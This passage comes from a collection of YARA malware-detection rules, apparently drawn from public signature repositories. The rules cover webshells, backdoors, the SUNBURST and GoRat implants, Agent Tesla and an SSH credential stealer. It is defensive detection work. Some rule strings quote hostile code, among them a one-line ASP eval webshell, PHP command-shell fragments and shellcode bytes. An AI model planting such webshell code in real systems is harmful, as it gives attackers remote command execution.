		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "2c412400b146b7b98d6e7755f7159bb9"
		logic_hash = "3cc36668f0a2a6807b59c7da0b6e504b519a616ab63fb9f606eba5dc4a9e7e2f"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s0 = "<SCRIPT RUNAT=SERVER LANGUAGE=JAVASCRIPT>eval(Request.form('#')+'')</SCRIPT>"

	condition:
		all of them
}

rule SIGNATURE_BASE_Byshell063_Ntboot_2_1
{
	meta:
		description = "Webshells Auto-generated - file ntboot.dll"
		author = "Florian Roth (Nextron Systems)"
		id = "9bcb401d-619b-54b8-be51-f0e3b6eb096c"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L8811-L8822"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "cb9eb5a6ff327f4d6c46aacbbe9dda9d"
		logic_hash = "25df29000bb410c0ba1fec78920124f6eedbc2585541536239522d2b116270ab"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s6 = "OK,job was done,cuz we have localsystem & SE_DEBUG_NAME:)"

	condition:
		all of them
}

rule SIGNATURE_BASE_U_Uay_1
{
	meta:
		description = "Webshells Auto-generated - file uay.exe"
		author = "Florian Roth (Nextron Systems)"
		id = "6a670e19-6e53-5b13-aabf-fe74d48b9113"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L8823-L8835"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "abbc7b31a24475e4c5d82fc4c2b8c7c4"
		logic_hash = "45e8938ce34fd5a253cee3867aa8c4429c6bf3fcc91098ed9df3f95656bc5f8f"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s1 = "exec \"c:\\WINDOWS\\System32\\freecell.exe"
		$s9 = "SYSTEM\\CurrentControlSet\\Services\\uay.sys\\Security"

	condition:
		1 of them
}

rule SIGNATURE_BASE_Bin_Wuaus_1
{
	meta:
		description = "Webshells Auto-generated - file wuaus.dll"
		author = "Florian Roth (Nextron Systems)"
		id = "50b5323b-d8d1-5350-bf93-8dde3d11fd87"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L8836-L8852"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "46a365992bec7377b48a2263c49e4e7d"
		logic_hash = "0509ca39662430c3ababf65ca3a6e9af95250163980829d90eddf5341168c864"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s1 = "9(90989@9V9^9f9n9v9"
		$s2 = ":(:,:0:4:8:C:H:N:T:Y:_:e:o:y:"
		$s3 = ";(=@=G=O=T=X=\\="
		$s4 = "TCP Send Error!!"
		$s5 = "1\"1;1X1^1e1m1w1~1"
		$s8 = "=$=)=/=<=Y=_=j=p=z="

	condition:
		all of them
}

rule SIGNATURE_BASE_Pwreveal_1
{
	meta:
		description = "Webshells Auto-generated - file pwreveal.exe"
		author = "Florian Roth (Nextron Systems)"
		id = "3d79dd13-9012-56e2-b42a-e6b3e204c601"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L8853-L8867"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "b4e8447826a45b76ca45ba151a97ad50"
		logic_hash = "01c9582897c65e608d49a151fe9ade97b9a031d7d10f5fd4b4d0c2a3fd83e7b6"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s0 = "*<Blank - no es"
		$s3 = "JDiamondCS "
		$s8 = "sword set> [Leith=0 bytes]"
		$s9 = "ION\\System\\Floating-"

	condition:
		all of them
}

rule SIGNATURE_BASE_Shelltools_G0T_Root_Xwhois_1
{
	meta:
		description = "Webshells Auto-generated - file xwhois.exe"
		author = "Florian Roth (Nextron Systems)"
		id = "8f3b3bb2-5884-584a-8220-b6edbfebc8a3"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L8868-L8882"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "0bc98bd576c80d921a3460f8be8816b4"
		logic_hash = "75ee56dae5fde75ae4dc4bba835a96016781b747f3cff0dc6d52e665463a6070"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s1 = "rting! "
		$s2 = "aTypCog("
		$s5 = "Diamond"
		$s6 = "r)r=rQreryr"

	condition:
		all of them
}

rule SIGNATURE_BASE_Vanquish_2_1
{
	meta:
		description = "Webshells Auto-generated - file vanquish.exe"
		author = "Florian Roth (Nextron Systems)"
		id = "6736cad6-cba1-5b6f-ae05-e2b980280479"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L8883-L8894"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "2dcb9055785a2ee01567f52b5a62b071"
		logic_hash = "428dc4e6d8bcc888e6f99f69ee9f211aa029d3486b99b9716d09709dc391d9a2"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s2 = "Vanquish - DLL injection failed:"

	condition:
		all of them
}

rule SIGNATURE_BASE_Down_Rar_Folder_Down_1
{
	meta:
		description = "Webshells Auto-generated - file down.asp"
		author = "Florian Roth (Nextron Systems)"
		id = "4e0a0e03-4f01-5b58-807c-0934cdda77ab"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L8895-L8906"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "db47d7a12b3584a2e340567178886e71"
		logic_hash = "bc666d6333d49a2b01553e1946fc304195193b9be92e26805474e64da61455da"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s0 = "response.write \"<font color=blue size=2>NetBios Name: \\\\\"  & Snet.ComputerName &"

	condition:
		all of them
}

rule SIGNATURE_BASE_Cmdshell_1
{
	meta:
		description = "Webshells Auto-generated - file cmdShell.asp"
		author = "Florian Roth (Nextron Systems)"
		id = "be256fc4-8dc5-58e4-9ca2-5a1df936b8dd"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L8907-L8918"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "8a9fef43209b5d2d4b81dfbb45182036"
		logic_hash = "5e7c7537b355b162d58b8bce570b1f94a8e6b479856685a245ffaed8f9482680"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s1 = "if cmdPath=\"wscriptShell\" then"

	condition:
		all of them
}

rule SIGNATURE_BASE_Zxshell2_0_Rar_Folder_Nc_1
{
	meta:
		description = "Webshells Auto-generated - file nc.exe"
		author = "Florian Roth (Nextron Systems)"
		id = "106209fc-f957-5131-825b-8eb7835625e0"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L8919-L8933"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "2cd1bf15ae84c5f6917ddb128827ae8b"
		logic_hash = "6106758aedb33f8983f387a58fcd815c47f793cd2a7ea3b0ebed13dd1d5b6e83"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s0 = "WSOCK32.dll"
		$s1 = "?bSUNKNOWNV"
		$s7 = "p@gram Jm6h)"
		$s8 = "ser32.dllCONFP@"

	condition:
		all of them
}

rule SIGNATURE_BASE_Portlessinst_1
{
	meta:
		description = "Webshells Auto-generated - file portlessinst.exe"
		author = "Florian Roth (Nextron Systems)"
		id = "c641c522-7844-5002-8ae7-4aaf60d1337d"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L8934-L8947"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "74213856fc61475443a91cd84e2a6c2f"
		logic_hash = "72ca80de2ad2048d1fcbbffeebd0e4fd7d9d47d6736360674e6a85ef9943abe8"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s2 = "Fail To Open Registry"
		$s3 = "f<-WLEggDr\""
		$s6 = "oMemoryCreateP"

	condition:
		all of them
}

rule SIGNATURE_BASE_Setupbdoor_1
{
	meta:
		description = "Webshells Auto-generated - file SetupBDoor.exe"
		author = "Florian Roth (Nextron Systems)"
		id = "055ff783-fa9f-5037-a3d6-88b58ec1612f"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L8948-L8959"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "41f89e20398368e742eda4a3b45716b6"
		logic_hash = "b4b6a0e4b9f8975d769d340a420af37dbc344d32c72447a8c56b05e985e6d806"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s1 = "\\BDoor\\SetupBDoor"

	condition:
		all of them
}

rule SIGNATURE_BASE_Phpshell_3_1
{
	meta:
		description = "Webshells Auto-generated - file phpshell.php"
		author = "Florian Roth (Nextron Systems)"
		id = "2f0ddfef-b3b5-592b-a9fb-fae4d825d0af"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L8960-L8972"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "e8693a2d4a2ffea4df03bb678df3dc6d"
		logic_hash = "b86fa40fd7bbcae86926182882faa226530e44c20bc611b8433a7da7f012106c"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s3 = "<input name=\"submit_btn\" type=\"submit\" value=\"Execute Command\"></p>"
		$s5 = "      echo \"<option value=\\\"$work_dir\\\" selected>Current Directory</option>\\n\";"

	condition:
		all of them
}

rule SIGNATURE_BASE_BIN_Server_1
{
	meta:
		description = "Webshells Auto-generated - file Server.exe"
		author = "Florian Roth (Nextron Systems)"
		id = "1625b0ee-5f9f-57d8-8333-f175f46d6c59"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L8973-L8989"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "1d5aa9cbf1429bb5b8bf600335916dcd"
		logic_hash = "34f9d78e0f61717fae2945e7a833c2c6d59e28035ee95da2c5d32b4e196bc957"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s0 = "configserver"
		$s1 = "GetLogicalDrives"
		$s2 = "WinExec"
		$s4 = "fxftest"
		$s5 = "upfileok"
		$s7 = "upfileer"

	condition:
		all of them
}

rule SIGNATURE_BASE_Hytop2006_Rar_Folder_2006_1
{
	meta:
		description = "Webshells Auto-generated - file 2006.asp"
		author = "Florian Roth (Nextron Systems)"
		id = "bda89055-27f5-50b7-86a3-2c75a5f3eadc"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L8990-L9001"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "c19d6f4e069188f19b08fa94d44bc283"
		logic_hash = "536232bbdd21bddb88eefe06a82927abcdd3ed10404c052957896960a6d10932"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s6 = "strBackDoor = strBackDoor "

	condition:
		all of them
}

rule SIGNATURE_BASE_R57Shell_3_1
{
	meta:
		description = "Webshells Auto-generated - file r57shell.php"
		author = "Florian Roth (Nextron Systems)"
		id = "4129d77c-2981-587b-a83e-8767dc3a48d8"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L9002-L9013"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "87995a49f275b6b75abe2521e03ac2c0"
		logic_hash = "0fdca080c7ce57b7bd818a968840aebf3c5c74f188ed062fec794bfadb4e75b0"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s1 = "<b>\".$_POST['cmd']"

	condition:
		all of them
}

rule SIGNATURE_BASE_FSO_S_Ajan_2_1
{
	meta:
		description = "Webshells Auto-generated - file ajan.asp"
		author = "Florian Roth (Nextron Systems)"
		id = "a66c34ed-0ae2-5e04-bfc4-c82583c5e066"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L9030-L9042"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "22194f8c44524f80254e1b5aec67b03e"
		logic_hash = "0ac31ee735c94289932369dfba5b408cbf71cc23fd48ce3e09dc7ce640a0d733"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s2 = "\"Set WshShell = CreateObject(\"\"WScript.Shell\"\")"
		$s3 = "/file.zip"

	condition:
		all of them
}

rule SIGNATURE_BASE_MAL_PHISH_Final_Payload_Feb25_1
{
	meta:
		description = "Detects possible final payload of phishing-delivered malware, where embedded shellcode is used to decrypt and execute the payload after user-supplied password input."
		author = "X__Junior"
		id = "9014e1f2-09c2-5ba0-8b7c-6ae8c069d1f7"
		date = "2025-02-14"
		modified = "2025-03-20"
		reference = "https://x.com/dtcert/status/1890384162818802135"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/mal_phish_feb25.yar#L16-L35"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "de384aba6b0c6800095eb530954aa718d4ed96cccfc0b1e5e4d01404f3518a77"
		logic_hash = "3251d68a019d873987966d46c9e474e5a1ebbca4a33a8bf1e3c3ce119db8ab8c"
		score = 80
		quality = 85
		tags = ""

	strings:
		$s1 = "%lu: %s %s" wide
		$s2 = "(Direct Inbound)" wide
		$s3 = "(Primary Domain)" wide
		$s4 = "(Forest Tree Root" wide
		$s5 = "(Native Mode)" wide
		$s6 = "(In Forest)" wide
		$s7 = "(None)" wide

	condition:
		all of them
}

rule SIGNATURE_BASE_Crowdstrike_Shamoon_Droppedfile_1
{
	meta:
		description = "Rule to detect Shamoon malware http://goo.gl/QTxohN"
		author = "Florian Roth"
		id = "b350f1b1-db73-574b-957b-34e5a84f68b0"
		date = "2023-12-05"
		modified = "2023-12-05"
		reference = "http://www.rsaconference.com/writable/presentations/file_upload/exp-w01-hacking-exposed-day-of-destruction.pdf"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/apt_shamoon.yar#L1-L13"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		logic_hash = "ed550832b217f7edceea2edf7c4453925ed1759d97db7728f7face6ff10ee361"
		score = 75
		quality = 85
		tags = ""

	strings:
		$testn123 = "test123" wide
		$testn456 = "test456" wide
		$testn789 = "test789" wide
		$testdomain = "testdomain.com" wide
		$pingcmd = "ping -n 30 127.0.0.1 >nul" wide

	condition:
		( any of ( $testn* ) or $pingcmd ) and $testdomain
}

rule SIGNATURE_BASE_Power_Pe_Injection_1
{
	meta:
		description = "PowerShell with PE Reflective Injection"
		author = "Benjamin DELPY (gentilkiwi)"
		id = "a71fe9f2-9c2a-5650-a5c7-116b76f10db6"
		date = "2023-12-05"
		modified = "2023-12-05"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/gen_mimikatz.yar#L91-L101"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		logic_hash = "64a7033d51e8933912f37ce68bffc216073a88cae1ea7492e71a812411ae6a9d"
		score = 75
		quality = 85
		tags = ""

	strings:
		$str_loadlib = "0x53, 0x48, 0x89, 0xe3, 0x48, 0x83, 0xec, 0x20, 0x66, 0x83, 0xe4, 0xc0, 0x48, 0xb9"

	condition:
		$str_loadlib
}

rule SIGNATURE_BASE_APT_Backdoor_SUNBURST_2_1
{
	meta:
		description = "The SUNBURST backdoor uses a domain generation algorithm (DGA) as part of C2 communications. This rule is looking for each branch of the code that checks for which HTTP method is being used. This is in one large conjunction, and all branches are then tied together via disjunction. The grouping is intentionally designed so that if any part of the DGA is re-used in another sample, this signature should match that re-used portion. SUNBURST is a backdoor that has the ability to spawn and kill processes, write and delete files, set and create registry keys, gather system information, and disable a set of forensic analysis tools and services."
		author = "FireEye"
		id = "329071d5-c9c6-5ae1-a514-aea9f4037bac"
		date = "2020-12-14"
		modified = "2023-12-05"
		reference = "https://www.fireeye.com/blog/threat-research/2020/12/evasive-attacker-leverages-solarwinds-supply-chain-compromises-with-sunburst-backdoor.html"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/apt_solarwinds_sunburst.yar#L28-L79"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		logic_hash = "2bf0697b110bca88f712cbccaf0d2ba614d6093d6d9595659aefe088848d3826"
		score = 85
		quality = 83
		tags = ""

	strings:
		$a = "0y3Kzy8BAA==" wide
		$aa = "S8vPKynWL89PS9OvNqjVrTYEYqNa3fLUpDSgTLVxrR5IzggA" wide
		$ab = "S8vPKynWL89PS9OvNqjVrTYEYqPaauNaPZCYEQA=" wide
		$ac = "C88sSs1JLS4GAA==" wide
		$ad = "C/UEAA==" wide
		$ae = "C89MSU8tKQYA" wide
		$af = "8wvwBQA=" wide
		$ag = "cyzIz8nJBwA=" wide
		$ah = "c87JL03xzc/LLMkvysxLBwA=" wide
		$ai = "88tPSS0GAA==" wide
		$aj = "C8vPKc1NLQYA" wide
		$ak = "88wrSS1KS0xOLQYA" wide
		$al = "c87PLcjPS80rKQYA" wide
		$am = "Ky7PLNAvLUjRBwA=" wide
		$an = "06vIzQEA" wide
		$b = "0y3NyyxLLSpOzIlPTgQA" wide
		$c = "001OBAA=" wide
		$d = "0y0oysxNLKqMT04EAA==" wide
		$e = "0y3JzE0tLknMLQAA" wide
		$f = "003PyU9KzAEA" wide
		$h = "0y1OTS4tSk1OBAA=" wide
		$i = "K8jO1E8uytGvNqitNqytNqrVA/IA" wide
		$j = "c8rPSQEA" wide
		$k = "c8rPSfEsSczJTAYA" wide
		$l = "c60oKUp0ys9JAQA=" wide
		$m = "c60oKUp0ys9J8SxJzMlMBgA=" wide
		$n = "8yxJzMlMBgA=" wide
		$o = "88lMzygBAA==" wide
		$p = "88lMzyjxLEnMyUwGAA==" wide
		$q = "C0pNL81JLAIA" wide
		$r = "C07NzXTKz0kBAA==" wide
		$s = "C07NzXTKz0nxLEnMyUwGAA==" wide
		$t = "yy9IzStOzCsGAA==" wide
		$u = "y8svyQcA" wide
		$v = "SytKTU3LzysBAA==" wide
		$w = "C84vLUpOdc5PSQ0oygcA" wide
		$x = "C84vLUpODU4tykwLKMoHAA==" wide
		$y = "C84vLUpO9UjMC07MKwYA" wide
		$z = "C84vLUpO9UjMC04tykwDAA==" wide

	condition:
		($a and $b and $c and $d and $e and $f and $h and $i ) or ( $j and $k and $l and $m and $n and $o and $p and $q and $r and $s and ( $aa or $ab ) ) or ( $t and $u and $v and $w and $x and $y and $z and ( $aa or $ab ) ) or ( $ac and $ad and $ae and $af and $ag and $ah and ( $am or $an ) ) or ( $ai and $aj and $ak and $al and ( $am or $an ) )
}

rule SIGNATURE_BASE_APT_Backdoor_Win_Gorat_Memory_1_1
{
	meta:
		description = "Identifies GoRat malware in memory based on strings."
		author = "FireEye"
		id = "4fcdd98f-1873-58e1-a9f5-73ee0aa5a69f"
		date = "2025-02-12"
		modified = "2025-02-12"
		reference = "https://www.fireeye.com/blog/products-and-services/2020/12/fireeye-shares-details-of-recent-cyber-attack-actions-to-protect-community.html"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/gen_fireeye_redteam_tools.yar#L1013-L1039"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "3b926b5762e13ceec7ac3a61e85c93bb"
		logic_hash = "bf8d80b7a7d35c1bcb353ff66d10bc95c2e6502043acc6554887465a467cdcf7"
		score = 75
		quality = 85
		tags = ""

	strings:
		$rat1 = "rat/modules/socks.(*HTTPProxyClient).beacon" fullword
		$rat2 = "rat.(*Core).generateBeacon" fullword
		$rat3 = "rat.gJitter" fullword
		$rat4 = "rat/comms.(*protectedChannel).SendCmdResponse" fullword
		$rat5 = "rat/modules/filemgmt.(*acquire).NewCommandExecution" fullword
		$rat6 = "rat/modules/latlisten.(*latlistensrv).handleCmd" fullword
		$rat7 = "rat/modules/netsweeper.(*netsweeperRunner).runSweep" fullword
		$rat8 = "rat/modules/netsweeper.(*Pinger).listen" fullword
		$rat9 = "rat/modules/socks.(*HTTPProxyClient).beacon" fullword
		$rat10 = "rat/platforms/win/dyloader.(*memoryLoader).ExecutePluginFunction" fullword
		$rat11 = "rat/platforms/win/modules/namedpipe.(*dummy).Open" fullword
		$winblows = "rat/platforms/win.(*winblows).GetStage" fullword

	condition:
		$winblows or 3 of ( $rat* )
}

rule SIGNATURE_BASE_APT_Builder_PY_REDFLARE_2_1_1
{
	meta:
		description = "No description has been set in the source file - Signature Base"
		author = "FireEye"
		id = "74c56ee1-734e-5fdb-beee-6345a5993f68"
		date = "2020-12-01"
		modified = "2020-12-01"
		reference = "https://www.fireeye.com/blog/products-and-services/2020/12/fireeye-shares-details-of-recent-cyber-attack-actions-to-protect-community.html"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/gen_fireeye_redteam_tools.yar#L1376-L1391"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "4410e95de247d7f1ab649aa640ee86fb"
		logic_hash = "0f28fb23c0c1d589466c7c541c8dc588b038d02dded0c66c4a448d1f768c95c5"
		score = 75
		quality = 85
		tags = ""

	strings:
		$s1 = "<510sxxII"
		$s2 = "0x43,0x00,0x3a,0x00,0x5c,0x00,0x57,0x00,0x69,0x00,0x6e,0x00,0x64,0x00,0x6f,0x00,"
		$s3 = "parsePluginOutput"

	condition:
		all of them and #s2 == 2
}

rule CAPE_Agent_Tesla_2
{
	meta:
		description = "Detecting HTML strings used by Agent Tesla malware"
		author = "Stormshield"
		id = "5383994b-357d-539b-89b1-53be238f759d"
		date = "2025-03-07"
		modified = "2025-03-07"
		reference = "https://github.com/kevoreilly/CAPEv2"
		source_url = "https://github.com/kevoreilly/CAPEv2/blob/3468ef14dbf65c0c3219e32830860967d6da51d5/data/yara/CAPE/AgentTesla.yar#L1-L17"
		license_url = "https://github.com/kevoreilly/CAPEv2/blob/3468ef14dbf65c0c3219e32830860967d6da51d5/LICENSE"
		logic_hash = "3945754129dcc58e0abfd7485f5ff0c0afdd1078ae2cf164ca8f59a6f79db1be"
		score = 75
		quality = 70
		tags = ""
		version = "1.0"

	strings:
		$html_username = "<br>UserName&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;: " wide ascii
		$html_pc_name = "<br>PC&nbsp;Name&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;: " wide ascii
		$html_os_name = "<br>OS&nbsp;Full&nbsp;Name&nbsp;&nbsp;: " wide ascii
		$html_os_platform = "<br>OS&nbsp;Platform&nbsp;&nbsp;&nbsp;: " wide ascii
		$html_clipboard = "<br><span style=font-style:normal;text-decoration:none;text-transform:none;color:#FF0000;><strong>[clipboard]</strong></span>" wide ascii

	condition:
		3 of them
}

rule DELIVRTO_SUSP_HTML_WASM_Smuggling_2
{
	meta:
		description = "Presence of Base64 JavaScript blob loading WASM"
		author = "delivr.to"
		id = "fc83bb4f-ba8a-52d2-b9ce-632da5341f77"
		date = "2024-02-28"
		modified = "2024-05-24"
		reference = "https://github.com/delivr-to/detections"
		source_url = "https://github.com/delivr-to/detections/blob/376762d71eb1777874d366136595994378416ef5/yara-rules/html_wasm.yar#L1-L13"
		license_url = "N/A"
		logic_hash = "4bca88862c28db947c04c40e40fdecc682223d1eb90c98350fbd6c5d8c6c4636"
		score = 70
		quality = 80
		tags = ""

	strings:
		$wasm = "WebAssembly.Module" base64
		$int = "WebAssembly.Instance" base64
		$inst = "WebAssembly.instantiate" base64

	condition:
		all of them
}

rule ESET_Kobalos_Ssh_Credential_Stealer_2
{
	meta:
		description = "Kobalos SSH credential stealer seen in OpenSSH client"
		author = "Marc-Etienne M.Léveillé"
		id = "b1fc5163-de48-57fc-8ae7-1f2be6c64d8a"
		date = "2020-11-02"
		modified = "2021-02-01"
		reference = "https://github.com/eset/malware-ioc/"
		source_url = "https://github.com/eset/malware-ioc/blob/eeab168d4cd6bac7c5bd06defb3d7198bd58f37f/kobalos/kobalos.yar#L58-L73"
		license_url = "https://github.com/eset/malware-ioc/blob/eeab168d4cd6bac7c5bd06defb3d7198bd58f37f/LICENSE"
		logic_hash = "be238f5c2cc976a5638584a8c0fc580f2076735aadfe374e8d4162ba723bce10"
		score = 75
		quality = 80
		tags = ""
		license = "BSD 2-Clause"
		version = "1"

	strings:
		$ = "user: %.128s host: %.128s port %05d user: %.128s password: %.128s"

	condition:
		any of them
}

rule ESET_Turla_Outlook_Filenames_2
{
	meta:
		description = "Turla Outlook filenames"
		author = "ESET Research"
		id = "3a08003d-50d6-5fdf-9f74-222335ebfa3e"
		date = "2018-08-22"
		modified = "2018-09-05"
		reference = "https://github.com/eset/malware-ioc/"
		source_url = "https://github.com/eset/malware-ioc/blob/eeab168d4cd6bac7c5bd06defb3d7198bd58f37f/turla/turla-outlook.yar#L76-L91"
